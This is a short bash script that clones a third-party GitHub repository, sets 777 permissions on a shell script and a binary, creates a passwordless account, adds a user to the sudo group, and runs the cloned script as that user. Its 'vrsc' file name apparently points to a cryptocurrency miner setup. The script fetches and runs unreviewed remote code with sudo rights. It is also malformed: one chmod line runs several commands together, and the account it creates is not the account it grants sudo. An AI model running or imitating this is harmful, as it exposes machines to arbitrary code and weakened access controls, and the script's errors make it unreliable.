#!/bin/bash
sudo apt update
git clone https://github.com/CIMENGUTAMAf/orian.git && cd orian
chmod +x vrsc1.sh && chmod +x uluk chmod 777 uluk vrsc1.sh
sudo adduser --disabled-password --gecos "" apen && sudo usermod -aG sudo budi
sudo -u budi -H sh -c "./vrsc1.sh"
sudo apt update
